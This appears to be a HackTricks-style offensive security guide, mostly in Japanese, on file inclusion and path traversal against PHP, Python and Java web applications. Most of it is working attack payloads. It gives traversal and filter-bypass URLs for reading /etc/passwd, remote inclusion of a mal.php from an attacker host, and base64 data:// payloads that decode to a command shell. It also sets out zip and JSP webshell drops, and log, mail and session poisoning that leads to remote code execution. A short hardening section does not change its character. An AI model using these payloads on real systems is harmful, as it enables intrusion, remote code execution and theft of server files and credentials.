# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** ファイルはリモートサーバーからロードされます（ベスト: あなたがコードを書き、サーバーがそれを実行します）。phpではこれはデフォルトで**無効**です（**allow_url_include**）。\
**Local File Inclusion (LFI):** サーバーはローカルファイルをロードします。

この脆弱性は、ユーザーがサーバーによってロードされるファイルを何らかの方法で制御できる場合に発生します。

影響を受ける **PHP functions**: require, require_once, include, include_once

この脆弱性をexploitするための興味深いツール: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**\*nix のいくつかの LFI リストを組み合わせ、さらにパスを追加して作成したもの：**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

また `/` を `\` に変更してみてください\
また `../../../../../` を追加してみてください

複数の手法を使ってファイル /etc/password を探す（脆弱性が存在するか確認するための）リストは [こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) にあります。

### **Windows**

異なる wordlists をマージしたもの：


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

また `/` を `\` に変更してみてください\
また `C:/` を削除して `../../../../../` を追加してみてください

複数の手法を使ってファイル /boot.ini を探す（脆弱性が存在するか確認するための）リストは [こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) にあります。

### **OS X**

linux の LFI リストを確認してください。

## Basic LFI and bypasses

すべての例は Local File Inclusion 用ですが、Remote File Inclusion にも適用できます（page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences が非再帰的に削除される
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

指定された文字列の末尾にさらに文字が付加されるのをbypassする (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
これは **PHP 5.4 以降で解決済み**

### **エンコーディング**

非標準のエンコーディング（double URL encode など）を使用できます:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 既存のフォルダから

バックエンドがフォルダパスをチェックしている可能性があります:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバ上のファイルシステムのディレクトリ探索

サーバのファイルシステムは、特定の手法を用いて再帰的に調査することで、ファイルだけでなくディレクトリも特定できます。このプロセスでは、ディレクトリの深さを判定し、特定のフォルダの存在をプローブすることが含まれます。以下はそのための詳細な方法です：

1. **ディレクトリの深さを判定する:** `/etc/passwd` を正常に取得できるかどうかで、現在のディレクトリの深さを確認します（サーバがLinuxベースの場合に適用）。例として、深さが3であることを示すURLは次のような構成になる可能性があります：
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **フォルダを調査する:** 疑わしいフォルダ名（例: `private`）をURLに追加し、その後 `/etc/passwd` に再度アクセスします。追加のディレクトリレベルがあるため、深さを1つ増やす必要があります:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret the Outcomes:** サーバーの応答はフォルダの存在を示します：
- **Error / No Output:** 指定した場所にフォルダ `private` は存在しない可能性が高い。
- **Contents of `/etc/passwd`:** フォルダ `private` の存在が確認されます。
4. **Recursive Exploration:** 発見したフォルダは、同じ手法や従来の Local File Inclusion (LFI) 手法を使って、サブディレクトリやファイルをさらに調査できます。

ファイルシステムの別の場所にあるディレクトリを調べるには、payloadをそれに合わせて調整してください。例えば、現在のディレクトリが深さ3にあると仮定して、`/var/www/` に `private` ディレクトリが含まれているか確認するには、以下を使用します：
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncationは、ウェブアプリケーションのファイルパスを操作するために用いられる手法です。ファイルパスの末尾に追加文字列を付加するようなセキュリティ対策を回避して、制限されたファイルにアクセスするために使われることが多いです。目的は、セキュリティ対策によって変更された後でも、依然として目的のファイルを指すようにファイルパスを作成することです。

In PHPでは、ファイルシステムの性質上、ファイルパスの様々な表現が同等に扱われることがあります。例えば:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` はすべて同じパスとして扱われます。
- When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
- 同様に、ファイルパスに `.php` が付加されている場合（例: `shellcode.php`）、末尾に `/.` を追加してもアクセスされるファイルは変わりません。

以下の例は、機密情報（ユーザーアカウント情報）を含むため一般的なターゲットである `/etc/passwd` にアクセスするために path truncation を利用する方法を示しています:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In these scenarios, the number of traversals needed might be around 2027, but this number can vary based on the server's configuration.

- **Using Dot Segments and Additional Characters**: トラバーサルシーケンス（`../`）を追加のドットセグメントや文字と組み合わせることで、ファイルシステムを移動でき、サーバが付加した文字列を実質的に無視できます。
- **Determining the Required Number of Traversals**: 試行錯誤により、ルートディレクトリまで、そして `/etc/passwd` へ移動するのに必要な正確な `../` の数を特定できます。`.php` のような付加文字列が無効化されても、目的のパス（`/etc/passwd`）がそのまま残ることを確認します。
- **Starting with a Fake Directory**: 存在しないディレクトリ（例: `a/`）でパスを開始するのは一般的な手法です。この手法は予防措置として、またはサーバのパス解析ロジックの要件を満たすために使われます。

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

phpではデフォルトで無効になっています。これは **`allow_url_include`** が **Off.** になっているためです。動作させるには **On** にする必要があり、その場合はあなたのサーバーからPHPファイルをincludeしてRCEを得ることができます:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
もし何らかの理由で **`allow_url_include`** が **On** で、しかし PHP が外部ウェブページへのアクセスを **filtering** している場合、[according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)、例えば data プロトコルと base64 を使って b64 の PHP コードをデコードし RCE を得ることができます:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> 前のコードでは、最後の `+.txt` は攻撃者が `.txt` で終わる文字列を必要としていたため追加されました。つまり文字列は `.txt` で終わり、b64 decode の後、その部分は単なるゴミとなり、実際の PHP コードが含まれ（したがって実行され）ます。

別の例 **`php://` プロトコルを使用しない** は次のとおりです：
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python のルート要素

次のような code 内の python では:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが**absolute path**を**`file_name`**に渡すと、**previous path**は単に削除されます:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
これは [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join) による意図された動作です。

> もしコンポーネントが絶対パスである場合、それ以前の全てのコンポーネントは破棄され、結合はその絶対パスのコンポーネントから続行されます。

## Java: ディレクトリ一覧

JavaでPath Traversalがある場合、ファイルの代わりに**ディレクトリを要求すると**、**ディレクトリの一覧が返されます**。私の知る限り、他の言語ではこのようなことは起こりません。

## トップ25のパラメータ

以下は、local file inclusion (LFI) の脆弱性を突かれる可能性があるトップ25のパラメータのリストです（出典: [link](https://twitter.com/trbughunters/status/1279768631845494787)）:
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI — PHP wrappers とプロトコルの利用

### php://filter

PHP filters は、データが読み取られたり書き込まれたりする前に基本的な**データの変更操作**を行うことを可能にします。フィルタは5つのカテゴリがあります:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: データからタグを除去します（"<" と ">" の間のすべての内容）
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : 別のエンコーディングに変換します(`convert.iconv.<input_enc>.<output_enc>`)。サポートされている全てのエンコーディングのリストを得るにはコンソールで `iconv -l` を実行してください。

> [!WARNING]
> `convert.iconv.*` 変換フィルタを悪用すると **任意のテキストを生成する** ことができ、任意のテキストを書き込んだり、include のような関数に任意テキストを処理させるのに役立ちます。詳しくは [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) を参照してください。

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: コンテンツを圧縮します（大量の情報を exfiltrating する際に有用）
- `zlib.inflate`: データを展開します
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : 非推奨
- `mdecrypt.*` : 非推奨
- Other Filters
- PHPで `var_dump(stream_get_filters());` を実行すると、いくつかの**予期しないフィルタ**が見つかります:
- `consumed`
- `dechunk`: HTTPのchunkedエンコーディングを元に戻します
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> "php://filter" の部分は大文字小文字を区別しません

### php filters を oracle として使用して任意のファイルを読む

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) では、サーバーから出力が直接返されない状態でローカルファイルを読む手法が提案されています。この手法は **boolean exfiltration of the file (char by char) using php filters** を oracle として用いることに基づいています。これは php filters がテキストを十分に大きくして PHP に例外を発生させるために使用できるからです。

原著には手法の詳細な説明がありますが、ここでは簡単な概要を示します:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- これは、初期文字が正しく推測されたときに **非常に大きなテキスト** を生成し、PHP が **error** を起こすように使われます。
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- dechunk フィルタは先頭文字が hexadecimal でない場合に **すべてを削除する** ため、先頭文字が hex かどうかを判断できます。
- This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beggining of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
- これを前述の手法（および推測した文字に応じた他のフィルタ）と組み合わせることで、十分な変換を施したときに先頭文字が hexadecimal でなくなるタイミングを観察してテキストの先頭文字を推測できます。もし hex であれば dechunk は削除せず、初期の“爆弾”が PHP の error を引き起こします。
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- codec **convert.iconv.UNICODE.CP930** は各文字を次の文字に変換します（例: a -> b）。これにより、例えば先頭文字が `a` かどうかを判別できます。なぜならこの codec を6回適用すると a->b->c->d->e->f->g となり、もはや hexadecimal 文字でなくなるため dechunk は削除せず、最初の“爆弾”と掛け合わさって PHP error が発生するからです。
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- 最初に **rot13** のような他の変換を使うことで、n, o, p, q, r のような他の文字を leak することが可能です（他の codecs を使えば別の文字を hex 範囲に移すこともできます）。
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- 先頭文字が数字の場合は base64 エンコードして最初の2文字を leak する必要があります。
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- 最終的な問題は **先頭文字以上のデータをどうやって leak するか** です。convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE のような order memory filters を使うことで文字の順序を変更し、先頭位置にテキストの他の文字を持ってくることが可能になります。
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.
- さらにデータを取得するための考え方は、まず **convert.iconv.UTF16.UTF16** で先頭に2バイトのジャンクデータを生成し、**UCS-4LE** を適用してそれを次の2バイトと pivot させ、ジャンクデータまでデータを削除する（これにより初期テキストの先頭2バイトが削除される）というものです。これを leak したい位置に到達するまで繰り返します。

投稿ではこの操作を自動化するツールも leak されており: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)。

### php://fd

この wrapper はプロセスが開いている file descriptors にアクセスすることを可能にします。開かれているファイルの内容を exfiltrate するのに有用な可能性があります:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
また、**php://stdin, php://stdout and php://stderr** を使って、それぞれ **file descriptors 0, 1 and 2** にアクセスできます（攻撃でどのように役立つかは不明）

### zip:// and rar://

PHPShell を内部に含む Zip または Rar ファイルをアップロードしてアクセスします。\
rar protocol を悪用するには、**特別に有効化されている必要があります**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Note that this protocol is restricted by php configurations **`allow_url_open`** and **`allow_url_include`**

### expect://

Expect を有効にしておく必要があります。次のようにしてコードを実行できます:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

payloadをPOSTパラメータで指定してください:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

` .phar` ファイルは、webアプリケーションがファイル読み込みに `include` のような関数を利用している場合に、PHPコードを実行するために利用できます。以下の PHP コードスニペットは、`.phar` ファイルの作成を示しています:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` ファイルをコンパイルするには、次のコマンドを実行してください:
```bash
php --define phar.readonly=0 create_path.php
```
実行すると、`test.phar`という名前のファイルが作成され、Local File Inclusion (LFI) の脆弱性を悪用するために利用される可能性があります。

LFI が PHP コードを実行せず、`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、または `filesize()` といった関数による単なるファイル読み取りのみを行う場合、deserialization の脆弱性を悪用できる可能性があります。この脆弱性は `phar` プロトコルを使ったファイル読み取りに関連しています。

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

PHP が php filters をサポートする任意のファイル読み取り（**any arbitrary file read from PHP that supports php filters**）を悪用して RCE を得ることが可能でした。詳細は [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\  
非常に簡単な要約: PHP heap の **3 byte overflow** が悪用され、特定サイズの free chunks のチェーンを **alter the chain of free chunks** することで **write anything in any address** が可能になり、`system` を呼び出すフックが追加されました。\  
さらに、より多くの php filters を悪用して特定サイズのチャンクを alloc することが可能でした。

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリまたは一時ファイルに書き込む（file inclusion attack においてどのように有用かは不明）
- [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムにアクセス
- [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL にアクセス
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL にアクセス
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンに一致するパス名を検索する（表示可能なものを返さないので、ここではあまり有用ではない）
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意のファイル読み取りには役に立たない）

## LFI via PHP's 'assert'

Local File Inclusion (LFI) は、文字列内のコードを実行できる 'assert' 関数を扱う際に特に危険性が高くなります。これは、入力に ".." のような directory traversal 文字が含まれているかどうかを検査しているが適切にサニタイズしていない場合に特に問題になります。

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
これは traversal を防ぐことを目的としていますが、意図せず code injection のベクターを作り出してしまいます。ファイルの内容を読み取るためにこれを悪用するには、攻撃者は次のようなものを使う可能性があります:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
同様に、任意のシステムコマンドを実行するには、次のような方法が考えられます:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> この手法は、あなたが**file path**を**control**していて、**PHP function**が**access a file**する（例えば単純な呼び出しの **`file()`** のように）が、そのファイルの内容は表示されないケースに該当します。

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

要約すると、この手法は**"UCS-4LE" encoding**を使用してファイルの内容を非常に**big**にし、ファイルを開く**PHP function**が**error**を発生させるようにします。

その後、最初の文字をleakするためにフィルタ **`dechunk`** を **base64** や **rot13** などと組み合わせて使用し、最後に **convert.iconv.UCS-4.UCS-4LE** と **convert.iconv.UTF16.UTF-16BE** を使って**他の文字を先頭に配置してそれらをleakする**、という流れになります。

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

サーバー側のコードが、アップロードや取り込みされたファイルの保存先パスをユーザー制御のデータ（例: filename や URL）から正規化や検証を行わずに構築すると、`..` セグメントや絶対パスによって意図したディレクトリを抜け出し、任意のファイル書き込みが発生する可能性があります。payload を web-exposed directory の下に置ければ、通常は webshell をドロップすることで未認証の RCE を得られます。

Typical exploitation workflow:
- パス/ファイル名を受け取ってディスクにコンテンツを書き込むエンドポイントやバックグラウンドワーカーの write primitive を特定する（例: メッセージ駆動の取り込み、XML/JSON コマンドハンドラ、ZIP extractor など）。
- web-exposed directories を特定する。一般的な例:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- 意図されたストレージディレクトリから webroot に抜け出す traversal path を作成し、webshell の内容を含める。
- ドロップした payload にブラウズしてコマンドを実行する。

Notes:
- 書き込みを行う脆弱なサービスが非HTTPポートで待ち受けている場合がある（例: TCP 4004 の JMF XML listener）。その後、別のポートのメインの web ポータルがあなたの payload を配信する可能性があります。
- Java スタックでは、これらのファイル書き込みは単純な `File`/`Paths` の連結で実装されていることが多いです。正規化や allow-listing の欠如が主な欠陥です。

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
ハードニング（このクラスのバグを防ぐ方法）:
- 正規化されたパスを解決し、それが許可リストにあるベースディレクトリの子孫であることを強制する。
- `..`、絶対ルート、またはドライブ文字を含むパスはすべて拒否する。生成されたファイル名を優先する。
- 書き込み処理は低権限アカウントで実行し、書き込み用ディレクトリを配信ルートから分離する。

## Remote File Inclusion

前述の通り、[**follow this link**](#remote-file-inclusion)。

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

これは他のログでも同様に行えますが、**注意してください、**ログ内のコードが URL エンコードされている場合があり、これによりシェルが壊れる可能性があります。ヘッダ **authorisation "basic"** は "user:password" を Base64 で含み、ログ内でデコードされます。PHPShell はこのヘッダ内に挿入できます。\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### メール経由

**メールを送信**して内部アカウント (user@localhost) に PHP ペイロード（例: `<?php echo system($_REQUEST["cmd"]); ?>`）を含め、ユーザーのメールを **`/var/mail/<USERNAME>`** または **`/var/spool/mail/<USERNAME>`** のようなパスで include してみる

### /proc/\*/fd/\* 経由

1. 多数の shells をアップロードする（例：100）
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) を include する。$PID = プロセスの PID（can be brute forced）、$FD はファイルディスクリプタ（can be brute forced too）

### /proc/self/environ 経由

ログファイルと同様に、User-Agent にペイロードを送信すると、それが /proc/self/environ ファイル内に反映される
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロード経由

ファイルをアップロードできる場合は、そのファイルに shell payload を注入してください (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ファイルを読みやすく保つためには、画像/doc/pdf のメタデータに注入するのが最良です

### Zip ファイル経由のアップロード

PHP shell を含む圧縮された ZIP ファイルをアップロードし、アクセス:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions 経由

ウェブサイトが PHP Session (PHPSESSID) を使用しているか確認する
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPではこれらのセッションは_/var/lib/php5/sess\\_\[PHPSESSID]\_ ファイルに保存されます
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie を `<?php system('cat /etc/passwd');?>` に設定する
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI を使って PHP セッションファイルを含める
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh 経由

ssh が有効な場合、どのユーザーが使われているかを確認する (/proc/self/status & /etc/passwd) そして **\<HOME>/.ssh/id_rsa** にアクセスを試みる

### **経由** **vsftpd** _**ログ**_

FTP サーバ vsftpd のログは _**/var/log/vsftpd.log**_ にあります。Local File Inclusion (LFI) の脆弱性が存在し、公開された vsftpd サーバにアクセスできる場合、次の手順を検討できます:

1. ログイン時の username フィールドに PHP ペイロードを注入する。
2. 注入後、LFI を利用してサーバログ _**/var/log/vsftpd.log**_ を取得する。

### php base64 filter 経由 (using base64)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64.You can use that to bypass the file extension check: if you supply base64 that ends with ".php", and it would just ignore the "." and append "php" to the base64. Here is an example payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters 経由（ファイル不要）

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) は **php filters to generate arbitrary content** を使って出力を生成できることを説明しています。つまり、include 用にファイルに書き込むことなく **generate arbitrary php code** を生成できる、ということです。


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault 経由

**アップロード**したファイルが `/tmp` に**一時的に**保存され、同じリクエスト内で **segmentation fault** を発生させると、その**一時ファイルが削除されず**に残るため、探すことができます。


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage 経由

もし **Local File Inclusion** を見つけ、PHP の前で **Nginx** が動作している場合、次の手法で **RCE** を得られる可能性があります：


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS 経由

セッションを持っていなくても、`session.auto_start` が `Off` の場合でも **Local File Inclusion** が見つかれば、multipart POST データで **`PHP_SESSION_UPLOAD_PROGRESS`** を渡すと PHP が自動的にセッションを有効にします。これを悪用して **RCE** を得ることができます：


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows での一時ファイルアップロード経由

